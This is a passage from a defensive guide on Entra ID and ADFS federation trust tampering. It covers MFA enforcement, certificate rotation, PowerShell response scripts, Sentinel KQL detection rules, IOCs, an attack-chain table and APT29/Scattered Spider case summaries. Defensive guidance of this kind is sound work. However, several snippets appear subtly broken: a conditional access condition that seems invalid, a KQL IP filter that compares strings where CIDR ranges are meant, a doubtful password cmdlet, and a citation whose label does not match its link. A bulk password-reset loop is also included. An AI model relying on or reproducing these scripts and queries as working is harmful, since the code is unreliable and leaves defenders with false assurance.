   - Select **Require multi-factor authentication**
7. **Enable policy:** **On**

**Effect:** Even if a forged SAML token claims MFA was performed, Entra ID will require MFA again.

**PowerShell (Enforce MFA for Federated Users):**

```powershell
# Create conditional access policy that requires MFA for federated users
$caPolicy = @{
    DisplayName = "Enforce MFA for Federated Users"
    State = "enabled"
    Conditions = @{
        AuthenticationMethods = @("federated")
        Applications = @{ IncludeApplications = "All" }
    }
    GrantControls = @{
        BuiltInControls = @("mfa")
        Operator = "OR"
    }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $caPolicy
```

**Apply To:** All Entra ID tenants with federated domains

---

**4. Rotate Federation Signing Certificates Regularly (Every 1-2 Years)**

Implement an automated certificate rotation schedule to invalidate any stolen or backdoored certificates.

**Manual Steps:**

1. In **ADFS Management Console**:
   - Right-click **AD FS** → **Manage Certificates**
   - Click **Token-Signing** tab
   - Review certificate expiration dates
   - Create and stage a replacement certificate 90 days before expiry

2. In **Entra ID** (via PowerShell):
   - Upload the new certificate to the federated domain
   - Set as primary (Entra ID will prefer it)
   - After confirming new cert is working, remove the old certificate

**PowerShell (Automated Rotation Check):**

```powershell
# Check ADFS certificates for approaching expiration
Import-Module ADFS

$tokenSigningCerts = Get-ADFSCertificate -CertificateType Token-Signing

foreach ($cert in $tokenSigningCerts) {
    $daysUntilExpiry = ($cert.NotAfter - (Get-Date)).Days
    
    if ($daysUntilExpiry -lt 90) {
        Write-Warning "Token signing certificate expiring in $daysUntilExpiry days"
        Write-Warning "Initiate certificate rotation process immediately"
        Write-Warning "Thumbprint: $($cert.Thumbprint)"
    }
}
```

**Apply To:** All federated deployments with a formal certificate rotation schedule

---

### Priority 2: HIGH

**5. Monitor for Suspicious SAML Token Patterns**

Detect forged SAML tokens by analyzing token signatures and claims for anomalies.

**Manual Configuration (Microsoft Sentinel):**

1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **Rule Name:** "Forged SAML Token Detection"
3. **KQL Query:**

```kusto
SigninLogs
| where ConditionalAccessStatus == "notApplied"
| where AuthenticationRequirement == "multiFactorAuthentication"  // Claimed MFA but CA shows otherwise
| where SignInStatus == "Success"
| where AppDisplayName contains "Office 365" or AppDisplayName contains "Azure"
| project TimeGenerated, UserPrincipalName, IpAddress, LocationDetails, AuthenticationMethodsUsed, ConditionalAccessStatus
```

**Apply To:** All Entra ID tenants with federated authentication

---

**6. Restrict Cross-Tenant Synchronization to Explicitly Approved Partners**

Disable automatic cross-tenant user invitation redemption and synchronization by default.

**Manual Steps (Entra ID Portal):**

1. Navigate to **External Identities** → **Cross-tenant synchronization**
2. Under **Inbound access settings:**
   - For **Trust settings:** Uncheck "Automatically redeem invitations"
   - For **User sync settings:** Ensure "Allow users synced into this tenant" is NOT enabled unless explicitly needed
3. Review all **configured partners** and remove any not explicitly authorized
4. For legitimate partners, set **automatic consent** to **False**

**PowerShell (Disable Auto-Consent):**

```powershell
# Disable automatic redemption for all cross-tenant partners
$partners = Get-MgBetaCrossTenantAccessPolicyPartner

foreach ($partner in $partners) {
    Update-MgBetaCrossTenantAccessPolicyPartnerInboundTrust `
        -CrossTenantAccessPolicyPartnerId $partner.TenantId `
        -AutomaticUserConsentAllowed $false `
        -IsMfaRecognized $false
}

Write-Output "Disabled automatic user consent for all cross-tenant partners"
```

**Apply To:** All tenants with cross-tenant synchronization enabled

---

**7. Implement Enhanced Logging and Auditing for Federation Changes**

Enable detailed audit logging for all federation-related activities.

**Manual Steps:**

1. Navigate to **Purview Compliance Portal** → **Audit**
2. Enable **Audit log search** if not enabled
3. Configure **Azure AD Power BI Content** to track:
   - "Set federation settings on domain"
   - "Set domain authentication"
   - "Update federated domain"
4. Create **Custom Detection Rules** to alert on:
   - Any federation setting change
   - New certificate additions to federated domains
   - Domain conversion from Managed to Federated

**PowerShell (Search Federation Audit Logs):**

```powershell
# Search for federation modifications in the last 30 days
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) `
    -Operations "Set federation settings on domain", "Set domain authentication", "Update federated domain" `
    -ResultSize 5000 | 
    Select-Object UserIds, Operations, CreationDate, AuditData |
    Export-Csv -Path "C:\Reports\FederationAuditLog_$(Get-Date -Format 'yyyyMMdd').csv"
```

**Apply To:** All federated tenants

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Federation Configuration IOCs:**
- New signing certificate added to federated domain without documented approval
- Certificate subject name not matching legitimate ADFS server name
- Self-signed certificates in federation configuration
- Sudden changes to federation issuer URI or metadata endpoint
- Domain authentication switched from Managed to Federated without authorization
- New cross-tenant partners added to inbound synchronization settings
- Cross-tenant synchronization configured with "automatic user consent" enabled

**SAML Token IOCs:**
- SAML tokens with valid signatures but missing preceding Kerberos authentication events
- SAML assertions with abnormally long validity periods (> 1 hour)
- SAML tokens from users with no history of federated authentication
- SAML claims containing unexpected attributes or values
- SAML tokens for privileged accounts from unusual IP addresses/locations
- Token assertions with MFA bypass claims (NotMfaRequired=true) for normally-MFA-enforced accounts

### Forensic Artifacts

**Cloud Audit Logs:**
- **UnifiedAuditLog:** "Set federation settings on domain," "Set domain authentication," "Update federated domain"
- **AuditLogs (Entra ID):** Cross-tenant access policy modifications
- **SignInLogs:** SAML-based sign-ins from unusual locations, users, or IPs
- **AuditData JSON:** Contains specific certificate details, issuer URI changes, and configuration modifications

### Response Procedures

**1. Immediate Isolation:**

**Command (Revoke All Federated Domain Authentication):**

```powershell
# Immediately convert federated domain to Managed (cloud-only auth)
# This invalidates all SAML tokens and forged credentials

Convert-MsolFederatedDomain -DomainName "contoso.com" -Credential $adminCreds

Write-Output "Domain converted from Federated to Managed"
Write-Output "All users must authenticate directly to Entra ID"
```

**Manual (Azure Portal):**
1. Navigate to **Custom domain names**
2. Select the federated domain
3. Under **Federated domain settings**, click **Convert to managed authentication**
4. Confirm conversion
5. All users will be forced to use Entra ID passwords (MFA-protected)

---

**2. Collect Evidence:**

**Command:**

```powershell
# Export all federation configuration
$federatedDomains = Get-MsolDomain | Where-Object { $_.Authentication -eq "Federated" }

foreach ($domain in $federatedDomains) {
    $fedProp = Get-MsolFederationProperty -DomainName $domain.Name
    $fedProp | Export-Clixml -Path "C:\Evidence\FederationConfig_$($domain.Name).xml"
    
    # Export signing certificates
    $fedProp.SigningCertificate | Export-Csv -Path "C:\Evidence\SigningCerts_$($domain.Name).csv"
}

# Export cross-tenant synchronization configuration
Get-MgBetaCrossTenantAccessPolicyPartner | Export-Csv -Path "C:\Evidence\CrossTenantPartners.csv"

# Export federation audit logs (last 90 days)
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) `
    -Operations "Set federation settings on domain", "Set domain authentication" |
    Export-Csv -Path "C:\Evidence\FederationAuditLog_90days.csv"
```

---

**3. Revoke All Sessions and Reset Credentials:**

**Command:**

```powershell
# Get all users who have signed in via federated authentication recently
$fedSignIns = Get-MgAuditLogSignIn -Filter "authenticationIssuedAuthenticationMethod eq 'Federated'" | Select-Object -First 1000

# For each user, revoke all sessions
foreach ($signIn in $fedSignIns) {
    $userId = (Get-MgUser -Filter "userPrincipalName eq '$($signIn.UserPrincipalName)'").Id
    
    Revoke-MgUserSignInSession -UserId $userId
    
    # Force password reset
    Set-MgUserPassword -UserId $userId -NewPassword ([System.Web.Security.Membership]::GeneratePassword(20, 3))
}

Write-Output "Revoked all sessions for $($fedSignIns.Count) users"
```

---

**4. Investigate Token Forgery:**

**Query (Detect Forged Token Usage):**

```kusto
// Kql to detect anomalous SAML token usage
SigninLogs
| where AuthenticationMethodsUsed has "Federated"
| where ResultType == 0  // Successful sign-in
| where ConditionalAccessStatus == "notApplied"  // CA bypassed
| where IpAddress !in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")  // From external IP
| where Location !in ("United States", "France")  // From unexpected location
| project TimeGenerated, UserPrincipalName, IpAddress, Location, AppDisplayName, ResourceDisplayName
| order by TimeGenerated desc
```

---

**5. Remediation:**

- Remove all unauthorized signing certificates from federated domains
- Rotate all legitimate federation certificates immediately (force issue new certs)
- Convert federated domains to Managed (cloud-only) if federation is compromised
- Reset passwords for all users with administrative roles
- Force re-authentication of all active sessions
- Disable and review all cross-tenant synchronization configurations
- Audit and disable any suspicious service principals or app registrations
- Conduct forensic analysis on all sign-in logs for the past 90 days (or longer if available)
- Notify all users of the compromise and recommend password changes
- Implement enhanced monitoring for future federation configuration changes

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks admin into granting OAuth consent |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker escalates to Global Admin |
| **3** | **Persistence** | **[PERSIST-TRUST-001] Federation Trust Tampering** | **Attacker adds malicious signing certificate** |
| **4** | **Defense Evasion** | [EVADE-IMPAIR-007] Audit Log Tampering | Attacker covers tracks by removing audit evidence |
| **5** | **Impact** | [COLLECT-EMAIL-001] Email Exfiltration via Forged Token | Attacker accesses email as Global Admin |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (APT29)

**Target:** US Government agencies, private sector organizations

**Timeline:** December 2020 - March 2021

**Technique Status:** Confirmed active; extensively documented by Microsoft and CISA

**Impact:** APT29 compromised SolarWinds Orion software, gaining access to thousands of organizations. Once inside customer networks, they extracted ADFS Token Signing Certificates and used them to forge SAML tokens, gaining access to M365, Azure, and cloud services as any user. The attack persisted for months by using legitimate federation mechanisms; customers could not distinguish forged tokens from legitimate ones.

**Reference:** [Microsoft Advice for Incident Responders - SolarWinds Recovery](https://www.microsoft.com/en-us/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compr/)

---

### Example 2: APT29 Azure AD Federation Backdoor (Recent Activity)

**Target:** US government, NATO allies

**Timeline:** 2023-2024

**Technique Status:** Active exploitation; documented by Microsoft Threat Intelligence

**Impact:** APT29 compromised Global Admin accounts and added secondary SAML signing certificates to federated domains. These certificates were then used to forge tokens enabling access to cloud services as any user. The attack went undetected for months because the certificate blended with legitimate ADFS configuration. When discovered, certificate rotation revealed the attacker had maintained persistent access across multiple cloud environments.

**Reference:** [MITRE ATT&CK - APT29 Domain Trust Modification](https://attack.mitre.org/techniques/T1484/002/)

---

### Example 3: Scattered Spider Cross-Tenant Synchronization Backdoor

**Target:** Large enterprise organizations

**Timeline:** 2024

**Technique Status:** Active; documented in Security Operations Center reports

**Impact:** Scattered Spider gained initial access via social engineering, then escalated to Global Admin. They immediately created cross-tenant synchronization configurations pointing to attacker-controlled tenants, enabling them to push fake "admin" users into the victim organization. These backdoor users persisted indefinitely, allowing the attacker to regain access even after the initial compromise was remediated and the compromised admin account was disabled.

**Reference:** [Compromising Identity Provider Federation - CrowdStrike](https://cloudsecurityalliance.org/articles/compromising-identity-provider-federation)

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Unauthorized Federation Certificate Additions

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedBy
- **Alert Severity:** Critical
- **Frequency:** Run every 15 minutes

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Set federation settings on domain", "Update federated domain", "Set domain authentication")
| extend TargetDomain = extract(@"Name=(.+?),", 1, tostring(TargetResources))
| extend Thumbprints = extract_all(@"Thumbprint=(.+?)[,]", tostring(TargetResources))
| extend ModifyingUser = InitiatedBy.user.userPrincipalName
| where OperationName == "Set federation settings on domain"  // New cert addition
| project TimeGenerated, ModifyingUser, OperationName, TargetDomain, Thumbprints, AuditData
| order by TimeGenerated desc
```

**What This Detects:**
- Addition of new signing certificates to federated domains
- Modifications to federation settings
- Unexpected domain authentication changes

**Manual Configuration Steps:**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Unauthorized Federation Certificate Addition`
   - Severity: `Critical`
3. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `15 minutes`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

### Query 2: Detect Anomalous SAML Token Authentication Patterns

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** AuthenticationMethodsUsed, ConditionalAccessStatus, UserPrincipalName
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes

**KQL Query:**

```kusto
SigninLogs
| where AuthenticationMethodsUsed has "Federated"
| where ConditionalAccessStatus == "notApplied"  // CA should have been enforced
| where ResultType == 0  // Successful sign-in despite CA bypass
| where UserPrincipalName in ("admin@contoso.com", "globaladmin@contoso.com")  // Privileged users
| where LocationDetails.countryOrRegion !in ("US", "FR")  // Unexpected location
| project TimeGenerated, UserPrincipalName, IpAddress, LocationDetails, AppDisplayName
| order by TimeGenerated desc
```

**What This Detects:**
- Successful SAML-based sign-ins for privileged users from unexpected locations
- Sign-ins that bypass Conditional Access (possible forged tokens)
- Authentication patterns inconsistent with user behavior

**Manual Configuration Steps:**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Anomalous SAML Token Authentication`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

## 9. ADDITIONAL DETECTION GUIDANCE

### Purview Audit Log Queries

**Manual Configuration:**

1. Navigate to **Purview Compliance Portal** → **Audit**
2. Click **Search**
3. Set **Date range** to last 90 days
4. Under **Activities**, select:
   - "Set federation settings on domain"
   - "Set domain authentication"
   - "Update federated domain"
   - "Add cross-tenant partner"
   - "Update cross-tenant synchronization"
5. Click **Search**
6. Review all results for unauthorized modifications
7. Export to CSV for forensic analysis

---

## Conclusion

Federation trust configuration tampering is one of the most dangerous persistence mechanisms available to attackers because it leverages legitimate authentication infrastructure. Organizations must implement **comprehensive certificate auditing, strict MFA enforcement regardless of IdP claims, certificate pinning, and continuous monitoring** to prevent attackers from establishing long-term backdoors through federation abuse.

The effectiveness of this technique is significantly reduced through **regular certificate rotation, elimination of secondary certificates, conversion of federated domains to Managed (cloud-only), and enhanced logging of all federation-related activities**.

---
